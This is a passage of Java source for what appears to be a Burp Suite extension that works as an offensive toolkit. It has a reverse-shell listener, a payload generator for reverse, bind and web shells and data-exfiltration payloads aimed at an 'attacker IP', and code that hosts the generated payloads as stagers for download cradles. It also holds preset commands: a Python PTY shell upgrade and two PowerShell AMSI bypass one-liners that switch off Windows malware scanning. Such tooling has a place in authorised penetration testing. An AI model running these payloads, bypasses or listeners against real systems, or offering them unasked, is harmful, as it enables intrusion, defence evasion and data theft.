                cmd = "python3 -c 'import pty,os; pty.spawn(\"/bin/bash\"); os.system(\"export TERM=xterm-256color\")'";
                break;
            case "Stabilize Terminal (stty raw -echo; fg)":
                cmd = "stty raw -echo; fg";
                break;
            case "Whoami & Host (whoami; id; hostname)":
                cmd = "whoami; id; hostname";
                break;
            case "OS & Kernel Info (uname -a / systeminfo)":
                cmd = "uname -a; cat /etc/os-release 2>/dev/null || systeminfo";
                break;
            case "Network Config (ip a / ipconfig)":
                cmd = "ip a || ifconfig 2>/dev/null || ipconfig /all";
                break;
            case "Check Sudo Permissions (sudo -l)":
                cmd = "sudo -l";
                break;
            case "PowerShell AMSI Bypass (Memory Patch)":
                cmd = "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)";
                break;
            case "PowerShell Reflection Bypass":
                cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)";
                break;
        }

        if (!cmd.isEmpty()) {
            current.sendCommand(cmd, ioExecutor);
        }
    }

    // =========================================================================
    // PAYLOAD GENERATOR TAB BUILDER
    // =========================================================================
    private JPanel createPayloadGeneratorTab() {
        JPanel panel = new JPanel(new BorderLayout(8, 8));
        panel.setOpaque(false);

        // Top Control Grid
        JPanel controlsCard = new JPanel(new BorderLayout(0, 8));
        controlsCard.setBackground(UITheme.CARD_BG);
        controlsCard.setBorder(UITheme.createCardBorder());

        // Row 1: Search & Categories
        JPanel row1 = new JPanel(new GridBagLayout());
        row1.setOpaque(false);
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(3, 5, 3, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Search
        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel searchLabel = new JLabel("SEARCH TEMPLATES:");
        searchLabel.setFont(UITheme.FONT_SUBTITLE);
        searchLabel.setForeground(UITheme.TEXT_SECONDARY);
        row1.add(searchLabel, gbc);

        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 0.3;
        payloadSearchField = new JTextField();
        UITheme.styleTextField(payloadSearchField);
        payloadSearchField.setToolTipText("Filter by name, tool, or keyword (e.g. socat, tls, pty, amsi)");
        row1.add(payloadSearchField, gbc);

        // Category
        gbc.gridx = 2; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel catLabel = new JLabel("CATEGORY:");
        catLabel.setFont(UITheme.FONT_SUBTITLE);
        catLabel.setForeground(UITheme.TEXT_SECONDARY);
        row1.add(catLabel, gbc);

        gbc.gridx = 3; gbc.gridy = 0; gbc.weightx = 0.3;
        payloadCategoryCombo = new JComboBox<>(new String[] {
                "All Categories",
                PayloadCategory.REVERSE_SHELL.getDisplayName(),
                PayloadCategory.BIND_SHELL.getDisplayName(),
                PayloadCategory.WEB_SHELL.getDisplayName(),
                PayloadCategory.DATA_EXFILTRATION.getDisplayName(),
                PayloadCategory.STAGERS_HELPERS.getDisplayName()
        });
        UITheme.styleComboBox(payloadCategoryCombo);
        row1.add(payloadCategoryCombo, gbc);

        // OS
        gbc.gridx = 4; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel osLabel = new JLabel("TARGET OS:");
        osLabel.setFont(UITheme.FONT_SUBTITLE);
        osLabel.setForeground(UITheme.TEXT_SECONDARY);
        row1.add(osLabel, gbc);

        gbc.gridx = 5; gbc.gridy = 0; gbc.weightx = 0.2;
        payloadOsCombo = new JComboBox<>(new String[] {
                "All Platforms",
                "Linux / macOS",
                "Windows",
                "Web / Any",
                "Cross-Platform"
        });
        UITheme.styleComboBox(payloadOsCombo);
        row1.add(payloadOsCombo, gbc);

        // Row 2: Template Selection & Parameters
        JPanel row2 = new JPanel(new GridBagLayout());
        row2.setOpaque(false);

        // Template Combo
        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel tplLabel = new JLabel("TEMPLATE:");
        tplLabel.setFont(UITheme.FONT_SUBTITLE);
        tplLabel.setForeground(UITheme.TEXT_SECONDARY);
        row2.add(tplLabel, gbc);

        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 0.4;
        payloadTemplateCombo = new JComboBox<>();
        UITheme.styleComboBox(payloadTemplateCombo);
        row2.add(payloadTemplateCombo, gbc);

        // IP
        gbc.gridx = 2; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel ipLabel = new JLabel("ATTACKER IP:");
        ipLabel.setFont(UITheme.FONT_SUBTITLE);
        ipLabel.setForeground(UITheme.TEXT_SECONDARY);
        row2.add(ipLabel, gbc);

        gbc.gridx = 3; gbc.gridy = 0; gbc.weightx = 0.2;
        payloadIpCombo = new JComboBox<>();
        payloadIpCombo.setEditable(true);
        UITheme.styleComboBox(payloadIpCombo);
        populateIpAddresses(payloadIpCombo);
        row2.add(payloadIpCombo, gbc);

        // Port
        gbc.gridx = 4; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel portLabel = new JLabel("PORT:");
        portLabel.setFont(UITheme.FONT_SUBTITLE);
        portLabel.setForeground(UITheme.TEXT_SECONDARY);
        row2.add(portLabel, gbc);

        gbc.gridx = 5; gbc.gridy = 0; gbc.weightx = 0.1;
        payloadPortField = new JTextField("4444", 6);
        UITheme.styleTextField(payloadPortField);
        row2.add(payloadPortField, gbc);

        // Row 3: Advanced Parameters & Encoding
        JPanel row3 = new JPanel(new GridBagLayout());
        row3.setOpaque(false);

        // Shell Binary
        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel shellLabel = new JLabel("SHELL BINARY:");
        shellLabel.setFont(UITheme.FONT_SUBTITLE);
        shellLabel.setForeground(UITheme.TEXT_SECONDARY);
        row3.add(shellLabel, gbc);

        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 0.2;
        payloadShellField = new JTextField("/bin/bash", 12);
        UITheme.styleTextField(payloadShellField);
        row3.add(payloadShellField, gbc);

        // Target File / Cmd
        gbc.gridx = 2; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel fileLabel = new JLabel("TARGET FILE / CMD:");
        fileLabel.setFont(UITheme.FONT_SUBTITLE);
        fileLabel.setForeground(UITheme.TEXT_SECONDARY);
        row3.add(fileLabel, gbc);

        gbc.gridx = 3; gbc.gridy = 0; gbc.weightx = 0.25;
        payloadTargetFileField = new JTextField("/etc/passwd", 14);
        UITheme.styleTextField(payloadTargetFileField);
        row3.add(payloadTargetFileField, gbc);

        // Encoding
        gbc.gridx = 4; gbc.gridy = 0; gbc.weightx = 0.0;
        JLabel encLabel = new JLabel("ENCODING:");
        encLabel.setFont(UITheme.FONT_SUBTITLE);
        encLabel.setForeground(UITheme.TEXT_SECONDARY);
        row3.add(encLabel, gbc);

        gbc.gridx = 5; gbc.gridy = 0; gbc.weightx = 0.25;
        payloadEncodingCombo = new JComboBox<>(EncodingType.values());
        UITheme.styleComboBox(payloadEncodingCombo);
        row3.add(payloadEncodingCombo, gbc);

        // Row 4: Action Buttons
        JPanel row4 = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        row4.setOpaque(false);

        ModernButton autoFillBtn = new ModernButton("AUTO-FILL FROM LISTENER", new Color(71, 85, 105));
        ModernButton hostStagerBtn = new ModernButton("HOST AS STAGER ON WEBHOOK", new Color(13, 148, 136));
        ModernButton generateBtn = new ModernButton("GENERATE PAYLOAD", UITheme.STATUS_SUCCESS);
        ModernButton copyBtn = new ModernButton("COPY PAYLOAD", UITheme.STATUS_INFO);
        ModernButton saveFileBtn = new ModernButton("SAVE TO FILE", new Color(100, 116, 139));

        autoFillBtn.addActionListener(e -> autoFillFromListener());
        hostStagerBtn.addActionListener(e -> hostCurrentPayloadOnWebhook());
        generateBtn.addActionListener(e -> generateCurrentPayload());
        copyBtn.addActionListener(e -> copyPayloadToClipboard());
        saveFileBtn.addActionListener(e -> savePayloadToFile());

        row4.add(autoFillBtn);
        row4.add(hostStagerBtn);
        row4.add(generateBtn);
        row4.add(copyBtn);
        row4.add(saveFileBtn);

        controlsCard.add(row1, BorderLayout.NORTH);
        controlsCard.add(row2, BorderLayout.CENTER);

        JPanel bottomControls = new JPanel(new BorderLayout(0, 4));
        bottomControls.setOpaque(false);
        bottomControls.add(row3, BorderLayout.NORTH);
        bottomControls.add(row4, BorderLayout.SOUTH);
        controlsCard.add(bottomControls, BorderLayout.SOUTH);

        panel.add(controlsCard, BorderLayout.NORTH);

        // Center: Native Burp Text Editor
        payloadEditor = callbacks.createTextEditor();
        payloadEditor.setEditable(false);
        callbacks.customizeUiComponent(payloadEditor.getComponent());

        JPanel editorContainer = new JPanel(new BorderLayout());
        editorContainer.setBorder(new CompoundBorder(
                new TitledBorder(new LineBorder(UITheme.BORDER_LIGHT, 1), "GENERATED PAYLOAD", TitledBorder.LEFT, TitledBorder.TOP, UITheme.FONT_SUBTITLE, UITheme.TEXT_SECONDARY),
                new EmptyBorder(4, 4, 4, 4)
        ));
        editorContainer.setBackground(UITheme.CARD_BG);
        editorContainer.add(payloadEditor.getComponent(), BorderLayout.CENTER);

        // Description Box
        payloadDescriptionArea = new JTextArea(3, 40);
        payloadDescriptionArea.setFont(UITheme.FONT_SMALL);
        payloadDescriptionArea.setEditable(false);
        payloadDescriptionArea.setLineWrap(true);
        payloadDescriptionArea.setWrapStyleWord(true);
        payloadDescriptionArea.setBackground(UITheme.CARD_HEADER_BG);
        payloadDescriptionArea.setForeground(UITheme.TEXT_SECONDARY);
        payloadDescriptionArea.setBorder(new EmptyBorder(6, 10, 6, 10));

        JPanel descWrapper = new JPanel(new BorderLayout());
        descWrapper.setBorder(new CompoundBorder(
                new TitledBorder(new LineBorder(UITheme.BORDER_LIGHT, 1), "TEMPLATE DETAILS & PREREQUISITES", TitledBorder.LEFT, TitledBorder.TOP, UITheme.FONT_SUBTITLE, UITheme.TEXT_SECONDARY),
                new EmptyBorder(2, 4, 4, 4)
        ));
        descWrapper.setBackground(UITheme.CARD_BG);
        descWrapper.add(payloadDescriptionArea, BorderLayout.CENTER);

        JSplitPane payloadSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, editorContainer, descWrapper);
        payloadSplit.setResizeWeight(0.8);
        payloadSplit.setDividerSize(6);
        payloadSplit.setBorder(null);

        panel.add(payloadSplit, BorderLayout.CENTER);

        // Event Listeners
        javax.swing.Timer payloadSearchTimer = new javax.swing.Timer(150, evt -> filterTemplates());
        payloadSearchTimer.setRepeats(false);

        payloadSearchField.getDocument().addDocumentListener(new DocumentListener() {
            @Override public void insertUpdate(DocumentEvent e) { payloadSearchTimer.restart(); }
            @Override public void removeUpdate(DocumentEvent e) { payloadSearchTimer.restart(); }
            @Override public void changedUpdate(DocumentEvent e) { payloadSearchTimer.restart(); }
        });

        payloadCategoryCombo.addActionListener(e -> filterTemplates());
        payloadOsCombo.addActionListener(e -> filterTemplates());
        payloadTemplateCombo.addActionListener(e -> {
            updateTemplateMetadata();
            generateCurrentPayload();
        });

        filterTemplates();
        return panel;
    }

    private void filterTemplates() {
        String query = payloadSearchField != null ? payloadSearchField.getText().trim().toLowerCase() : "";
        String selectedCat = payloadCategoryCombo != null ? (String) payloadCategoryCombo.getSelectedItem() : "All Categories";
        String selectedOs = payloadOsCombo != null ? (String) payloadOsCombo.getSelectedItem() : "All Platforms";

        DefaultComboBoxModel<PayloadTemplate> model = new DefaultComboBoxModel<>();
        List<PayloadTemplate> all = PayloadRegistry.getAllTemplates();

        for (PayloadTemplate t : all) {
            boolean matchCat = "All Categories".equals(selectedCat) || t.getCategory().getDisplayName().equalsIgnoreCase(selectedCat);
            boolean matchOs = "All Platforms".equals(selectedOs) || t.getTargetOS().equalsIgnoreCase(selectedOs);
            boolean matchQuery = query.isEmpty() ||
                    t.getName().toLowerCase().contains(query) ||
                    t.getDescription().toLowerCase().contains(query) ||
                    t.getTargetOS().toLowerCase().contains(query);

            if (matchCat && matchOs && matchQuery) {
                model.addElement(t);
            }
        }

        if (payloadTemplateCombo != null) {
            payloadTemplateCombo.setModel(model);
            if (model.getSize() > 0) {
                payloadTemplateCombo.setSelectedIndex(0);
            }
            updateTemplateMetadata();
            generateCurrentPayload();
        }
    }

    private void updateTemplateMetadata() {
        PayloadTemplate template = (PayloadTemplate) payloadTemplateCombo.getSelectedItem();
        if (template == null) {
            payloadDescriptionArea.setText("No template selected.");
            return;
        }

        StringBuilder sb = new StringBuilder();
        sb.append(template.getName()).append(" [").append(template.getTargetOS()).append("] - ")
                .append(template.getCategory().getDisplayName()).append("\n");
        sb.append("Description: ").append(template.getDescription()).append("\n");
        sb.append("Parameters: IP Required: ").append(template.isRequiresIp() ? "Yes" : "No")
                .append(" | Port Required: ").append(template.isRequiresPort() ? "Yes" : "No")
                .append(" | Shell Binary: ").append(template.isRequiresShellPath() ? "Yes" : "No")
                .append(" | Target File: ").append(template.isRequiresFileOrCmd() ? "Yes" : "No");

        payloadDescriptionArea.setText(sb.toString());
        payloadShellField.setEnabled(template.isRequiresShellPath());
        payloadTargetFileField.setEnabled(template.isRequiresFileOrCmd());
    }

    private void generateCurrentPayload() {
        PayloadTemplate template = (PayloadTemplate) payloadTemplateCombo.getSelectedItem();
        if (template == null) {
            payloadEditor.setText(new byte[0]);
            return;
        }

        String ip = payloadIpCombo.getSelectedItem() != null ? ((String) payloadIpCombo.getSelectedItem()).trim() : "127.0.0.1";
        int port = 4444;
        try {
            port = Integer.parseInt(payloadPortField.getText().trim());
        } catch (NumberFormatException ignored) {}

        String shellPath = payloadShellField.getText().trim();
        String targetFile = payloadTargetFileField.getText().trim();
        String customCmd = "whoami";

        PayloadParams params = new PayloadParams(ip, port, shellPath, targetFile, customCmd);
        String rawPayload = template.generate(params);

        EncodingType encoding = (EncodingType) payloadEncodingCombo.getSelectedItem();
        if (encoding == null) encoding = EncodingType.RAW;

        String encodedPayload = PayloadEncoder.encode(rawPayload, encoding);
        payloadEditor.setText(encodedPayload.getBytes(StandardCharsets.UTF_8));
    }

    private void autoFillFromListener() {
        if (isListening && currentPort != -1) {
            payloadPortField.setText(String.valueOf(currentPort));
            if (payloadIpCombo.getItemCount() > 0) {
                payloadIpCombo.setSelectedIndex(payloadIpCombo.getItemCount() > 1 ? 1 : 0);
            }
            generateCurrentPayload();
            JOptionPane.showMessageDialog(this, "Auto-filled listener IP and Port: " + currentPort, "Listener Sync", JOptionPane.INFORMATION_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(this, "Listener is not currently active.", "Listener Offline", JOptionPane.WARNING_MESSAGE);
        }
    }

    private void hostCurrentPayloadOnWebhook() {
        byte[] bytes = payloadEditor.getText();
        if (bytes == null || bytes.length == 0) {
            JOptionPane.showMessageDialog(this, "Please generate a payload first.", "Empty Payload", JOptionPane.WARNING_MESSAGE);
            return;
        }

        String payloadStr = new String(bytes, StandardCharsets.UTF_8);
        PayloadTemplate tpl = (PayloadTemplate) payloadTemplateCombo.getSelectedItem();
        String filename = "payload";
        if (tpl != null) {
            if (tpl.getTargetOS().contains("Windows")) {
                filename = "rev.ps1";
            } else if (tpl.getTargetOS().contains("Linux")) {
                filename = "shell.sh";
            }
        }

        webhookConfig.autoHostPayload(payloadStr, filename);
        String activeIp = payloadIpCombo.getSelectedItem() != null ? (String) payloadIpCombo.getSelectedItem() : "127.0.0.1";
        int activePort = currentPort != -1 ? currentPort : 8080;

        String endpointMsg = "Payload successfully hosted on Webhook Listener!\n\n" +
                "Endpoints available:\n" +
                "- http://" + activeIp + ":" + activePort + "/payload\n" +
                "- http://" + activeIp + ":" + activePort + "/" + filename + "\n\n" +
                "Download cradles (e.g. IEX / curl) can now fetch this script directly.";

        JOptionPane.showMessageDialog(this, endpointMsg, "Stager Published", JOptionPane.INFORMATION_MESSAGE);
    }

    private void copyPayloadToClipboard() {
        byte[] bytes = payloadEditor.getText();
        if (bytes != null && bytes.length > 0) {
            String text = new String(bytes, StandardCharsets.UTF_8);
            StringSelection sel = new StringSelection(text);
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, null);
            JOptionPane.showMessageDialog(this, "Payload successfully copied to clipboard.", "Copied", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    private void savePayloadToFile() {
        byte[] bytes = payloadEditor.getText();
        if (bytes == null || bytes.length == 0) return;

        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setDialogTitle("Save Generated Payload");
        if (fileChooser.showSaveDialog(this) == JFileChooser.APPROVE_OPTION) {
            File file = fileChooser.getSelectedFile();
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(bytes);
                JOptionPane.showMessageDialog(this, "Payload saved successfully to: " + file.getAbsolutePath(), "File Saved", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException e) {
                JOptionPane.showMessageDialog(this, "Error saving file: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    // =========================================================================
    // LISTENER ENGINE & SOCKET HANDLING
    // =========================================================================
    private void startListener() {
        try {
            int port = Integer.parseInt(portField.getText().trim());
            if (port < 1 || port > 65535) {
                JOptionPane.showMessageDialog(this, "Port must be between 1 and 65535.", "Invalid Port", JOptionPane.ERROR_MESSAGE);
                return;
            }

            currentPort = port;
            String mode = (String) modeCombo.getSelectedItem();
            boolean useTls = tlsCheckBox.isSelected();

            startButton.setEnabled(false);
            stopButton.setEnabled(true);
            portField.setEnabled(false);
            modeCombo.setEnabled(false);
            tlsCheckBox.setEnabled(false);
            isListening = true;

            CardLayout cl = (CardLayout) modeCardsPanel.getLayout();
            if ("Reverse Shell".equals(mode)) {
                cl.show(modeCardsPanel, CARD_SHELL);
                shellStatusLabel.setText("STATUS: LISTENING ON PORT " + port + (useTls ? " (TLS/SSL)" : ""));
            } else {
                cl.show(modeCardsPanel, CARD_WEBHOOK);
            }

            listenerThread = new Thread(() -> {
                List<String> ipAddresses = getAvailableIpAddresses();
                SwingUtilities.invokeLater(() -> {
                    statusField.setText("ONLINE");
                    statusField.setBackground(UITheme.STATUS_SUCCESS);
                    updateIpDisplay(ipAddresses, port, mode, useTls);
                    vpnWarningLabel.setText(useTls ? "TLS Active - Click address to copy HTTPS URL." : "Click any address chip to copy.");
                });
                runListenerLoop(port, mode, useTls);
            });
            listenerThread.start();

        } catch (NumberFormatException e) {
            JOptionPane.showMessageDialog(this, "Please enter a valid numeric port.", "Invalid Port", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void runListenerLoop(int port, String mode, boolean useTls) {
        try {
            if (useTls) {
                serverSocket = TlsSocketHelper.createTlsServerSocket(port, 50, InetAddress.getByName("0.0.0.0"), callbacks);
                callbacks.printOutput("TLS/SSL Listener started on port " + port + " in mode: " + mode);
            } else {
                serverSocket = new ServerSocket(port, 50, InetAddress.getByName("0.0.0.0"));
                callbacks.printOutput("Plain TCP Listener started on port " + port + " in mode: " + mode);
            }

            while (isListening) {
                if ("Reverse Shell".equals(mode)) {
                    try {
                        Socket client = serverSocket.accept();
                        sessionManager.registerNewSession(client);
                    } catch (IOException e) {
                        if (isListening) {
                            callbacks.printError("Reverse shell accept error: " + e.getMessage());
                        }
                    }
                } else {
                    // HTTP Webhook Mode
                    try (Socket client = serverSocket.accept()) {
                        handleWebhookRequest(client, port);
                    } catch (IOException e) {
                        if (isListening) {
                            callbacks.printError("Webhook request error: " + e.getMessage());
                        }
                    }
                }
            }
        } catch (Exception e) {
            if (isListening) {
                callbacks.printError("Listener socket error: " + e.getMessage());
                SwingUtilities.invokeLater(() -> {
                    JOptionPane.showMessageDialog(this, "Failed to bind to port " + port + ": " + e.getMessage(), "Listener Error", JOptionPane.ERROR_MESSAGE);
                    stopListener();
                });
            }
        } finally {
            if (serverSocket != null && !serverSocket.isClosed()) {
                try { serverSocket.close(); } catch (IOException ignored) {}
            }
        }
    }

    private void handleWebhookRequest(Socket client, int port) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
        StringBuilder reqBuilder = new StringBuilder();
        String line;
        String method = "GET";
        String path = "/";
        String hostHeader = "localhost";
        int contentLength = 0;

        while ((line = reader.readLine()) != null && !line.isEmpty()) {
            reqBuilder.append(line).append("\n");
            if (line.contains(" HTTP/")) {
                String[] parts = line.split(" ");
                if (parts.length >= 2) {
                    method = parts[0];
                    path = parts[1];
                }
            }
            if (line.toLowerCase().startsWith("content-length:")) {
                try {
                    contentLength = Integer.parseInt(line.substring(line.indexOf(":") + 1).trim());
                    if (contentLength > 10 * 1024 * 1024) contentLength = 10 * 1024 * 1024;
                } catch (NumberFormatException ignored) {}
            }
            if (line.toLowerCase().startsWith("host:")) {
                hostHeader = line.substring(5).trim();
            }
        }

        if (contentLength > 0) {
            char[] body = new char[contentLength];
            int read = 0;
            while (read < contentLength) {
                int r = reader.read(body, read, contentLength - read);
                if (r == -1) break;
                read += r;
            }
            reqBuilder.append(body, 0, read);
        }

        String clientIp = client.getInetAddress().getHostAddress();

        // Build and write custom response with rich telemetry and routing
        byte[] responseBytes = webhookConfig.buildResponseBytes(clientIp, method, path, port, reqBuilder.toString(), contentLength);
        client.getOutputStream().write(responseBytes);
        client.getOutputStream().flush();

        if (!path.equals("/favicon.ico")) {
            byte[] reqBytes = reqBuilder.toString().getBytes(StandardCharsets.UTF_8);

            String host = "localhost";
            int reqPort = port;
            if (hostHeader.contains(":")) {
                String[] hp = hostHeader.split(":");
                host = hp[0];
                try { reqPort = Integer.parseInt(hp[1]); } catch (NumberFormatException ignored) {}
            } else if (!hostHeader.isEmpty()) {
                host = hostHeader;
            }

            IHttpService service = new HttpServiceImpl(host, reqPort, "http");
            addWebhookEntry(method, path, clientIp, reqBytes.length, reqBytes, responseBytes, service);
        }
    }

    private void addWebhookEntry(String method, String url, String clientIp, int size, byte[] reqBytes, byte[] respBytes, IHttpService service) {
        SwingUtilities.invokeLater(() -> {
            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            RequestEntry entry = new RequestEntry(requestHistory.size() + 1, method, url, clientIp, size, timestamp, reqBytes, respBytes, service);
            requestHistory.add(entry);
            webhookTableModel.addRow(new Object[] { entry.index, entry.method, entry.url, entry.clientIp, entry.size + " B", entry.timestamp });

            int last = webhookTableModel.getRowCount() - 1;
            int viewRow = webhookTable.convertRowIndexToView(last);
            if (viewRow >= 0) {
                webhookTable.setRowSelectionInterval(viewRow, viewRow);
                requestViewer.setMessage(reqBytes != null ? reqBytes : new byte[0], true);
                responseViewer.setMessage(respBytes != null ? respBytes : new byte[0], false);
            }
            clearHistoryButton.setEnabled(true);
        });
    }

    private void stopListener() {
        isListening = false;
        if (serverSocket != null && !serverSocket.isClosed()) {
            try { serverSocket.close(); } catch (IOException ignored) {}
        }
        if (listenerThread != null) {
            listenerThread.interrupt();
        }

        SwingUtilities.invokeLater(() -> {
            startButton.setEnabled(true);
            stopButton.setEnabled(false);
            portField.setEnabled(true);
            modeCombo.setEnabled(true);
            tlsCheckBox.setEnabled(true);
            currentPort = -1;
            statusField.setText("OFFLINE");
            statusField.setBackground(UITheme.STATUS_DANGER);
            clearIpDisplay();
            vpnWarningLabel.setText(" ");
            shellStatusLabel.setText("STATUS: LISTENER STOPPED");
        });
    }

    private void clearHistory() {
        requestHistory.clear();
        webhookTableModel.setRowCount(0);
        requestViewer.setMessage(new byte[0], true);
        responseViewer.setMessage(new byte[0], false);
        clearHistoryButton.setEnabled(false);
    }

    // =========================================================================
    // POPUP DIALOGS: MOCK ROUTES, RESPONSE CONFIG & KILL PORTS
    // =========================================================================
    private void showMockRoutesDialog() {
        JDialog dialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Mock Endpoint Routes & SSRF Redirector", Dialog.ModalityType.APPLICATION_MODAL);
        dialog.setLayout(new BorderLayout(10, 10));
        dialog.setSize(750, 450);
        dialog.setLocationRelativeTo(this);

        String[] cols = { "Enabled", "Path", "Match Type", "Status", "Content-Type", "Description" };
        DefaultTableModel model = new DefaultTableModel(cols, 0) {
            @Override public Class<?> getColumnClass(int col) { return col == 0 ? Boolean.class : String.class; }
            @Override public boolean isCellEditable(int row, int col) { return col == 0; }
        };

        List<MockRoute> routes = webhookConfig.getMockRoutes();
        for (MockRoute r : routes) {
            model.addRow(new Object[] { r.isEnabled(), r.getPath(), r.getMatchType().getDisplayName(), r.getStatusCode(), r.getContentType(), r.getDescription() });
        }

        JTable table = new JTable(model);
        table.setFont(UITheme.FONT_CODE);
        table.setRowHeight(24);
        table.getColumnModel().getColumn(0).setMaxWidth(60);

        model.addTableModelListener(e -> {
            int row = e.getFirstRow();
            if (row >= 0 && row < routes.size()) {
                boolean enabled = (Boolean) model.getValueAt(row, 0);
                routes.get(row).setEnabled(enabled);
            }
        });

        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 8));
        ModernButton addBtn = new ModernButton("ADD ROUTE", UITheme.STATUS_SUCCESS);
        ModernButton removeBtn = new ModernButton("DELETE ROUTE", UITheme.STATUS_DANGER);
        ModernButton closeBtn = new ModernButton("CLOSE", new Color(100, 116, 139));

        addBtn.addActionListener(e -> {
            String path = JOptionPane.showInputDialog(dialog, "Enter Route Path (e.g. /my-redirect or /api/data):", "/custom-endpoint");
            if (path != null && !path.trim().isEmpty()) {
                MockRoute newRoute = new MockRoute(path.trim(), MockRoute.MatchType.EXACT, "200 OK", "application/json", "{\"status\":\"ok\"}", "", "Custom Mock Endpoint");
                webhookConfig.addMockRoute(newRoute);
                model.addRow(new Object[] { newRoute.isEnabled(), newRoute.getPath(), newRoute.getMatchType().getDisplayName(), newRoute.getStatusCode(), newRoute.getContentType(), newRoute.getDescription() });
            }
        });

        removeBtn.addActionListener(e -> {
            int row = table.getSelectedRow();
            if (row >= 0 && row < routes.size()) {
                webhookConfig.removeMockRoute(routes.get(row));
                model.removeRow(row);
            }
        });

        closeBtn.addActionListener(e -> dialog.dispose());

        btnPanel.add(addBtn);
        btnPanel.add(removeBtn);
        btnPanel.add(closeBtn);

        dialog.add(new JScrollPane(table), BorderLayout.CENTER);
        dialog.add(btnPanel, BorderLayout.SOUTH);
        dialog.setVisible(true);
    }

    private void showResponseConfigDialog() {
        JDialog dialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Configure HTTP Webhook Response", Dialog.ModalityType.APPLICATION_MODAL);
        dialog.setLayout(new BorderLayout(10, 10));
        dialog.setSize(550, 420);
        dialog.setLocationRelativeTo(this);

        JPanel form = new JPanel(new GridBagLayout());
        form.setBorder(new EmptyBorder(14, 14, 14, 14));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Status Code
        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
        form.add(new JLabel("Status Code:"), gbc);
        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 1.0;
        JComboBox<String> statusCombo = new JComboBox<>(new String[] {
                "200 OK", "201 Created", "204 No Content", "301 Moved Permanently",
                "302 Found", "400 Bad Request", "401 Unauthorized", "403 Forbidden",
                "404 Not Found", "500 Internal Server Error"
        });
        statusCombo.setSelectedItem(webhookConfig.getStatusCode());
        form.add(statusCombo, gbc);

        // Content Type
        gbc.gridx = 0; gbc.gridy = 1; gbc.weightx = 0.0;
        form.add(new JLabel("Content-Type:"), gbc);
        gbc.gridx = 1; gbc.gridy = 1; gbc.weightx = 1.0;
        JComboBox<String> ctCombo = new JComboBox<>(new String[] {
                "text/html; charset=utf-8", "application/json; charset=utf-8",
                "text/plain; charset=utf-8", "application/xml", "image/png"
        });
        ctCombo.setEditable(true);
        ctCombo.setSelectedItem(webhookConfig.getContentType());
        form.add(ctCombo, gbc);

        // CORS
        gbc.gridx = 0; gbc.gridy = 2; gbc.weightx = 0.0;
        form.add(new JLabel("CORS Headers:"), gbc);
        gbc.gridx = 1; gbc.gridy = 2; gbc.weightx = 1.0;
        JCheckBox corsBox = new JCheckBox("Enable Access-Control-Allow-Origin: *", webhookConfig.isEnableCors());
        form.add(corsBox, gbc);

        // Response Body
        gbc.gridx = 0; gbc.gridy = 3; gbc.weightx = 0.0;
        form.add(new JLabel("Response Body:"), gbc);
        gbc.gridx = 1; gbc.gridy = 3; gbc.weightx = 1.0; gbc.weighty = 1.0; gbc.fill = GridBagConstraints.BOTH;
        JTextArea bodyArea = new JTextArea(webhookConfig.getResponseBody(), 6, 30);
        bodyArea.setFont(UITheme.FONT_CODE);
        form.add(new JScrollPane(bodyArea), gbc);

        // Buttons
        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 8));
        ModernButton saveBtn = new ModernButton("SAVE CONFIGURATION", UITheme.STATUS_SUCCESS);
        ModernButton cancelBtn = new ModernButton("CANCEL", new Color(100, 116, 139));

        saveBtn.addActionListener(e -> {
            webhookConfig.setStatusCode((String) statusCombo.getSelectedItem());
            webhookConfig.setContentType((String) ctCombo.getSelectedItem());
            webhookConfig.setEnableCors(corsBox.isSelected());
            webhookConfig.setResponseBody(bodyArea.getText());
            dialog.dispose();
            JOptionPane.showMessageDialog(this, "Webhook response configuration updated.", "Saved", JOptionPane.INFORMATION_MESSAGE);
        });
        cancelBtn.addActionListener(e -> dialog.dispose());

        btnPanel.add(saveBtn);
        btnPanel.add(cancelBtn);

        dialog.add(form, BorderLayout.CENTER);
        dialog.add(btnPanel, BorderLayout.SOUTH);
        dialog.setVisible(true);
    }

    private void killUsedPorts() {
        killPortsButton.setEnabled(false);
        ioExecutor.submit(() -> {
            List<PortInfo> usedPorts = PortScanner.getUsedPorts();
            SwingUtilities.invokeLater(() -> {
                killPortsButton.setEnabled(true);
                if (usedPorts.isEmpty()) {
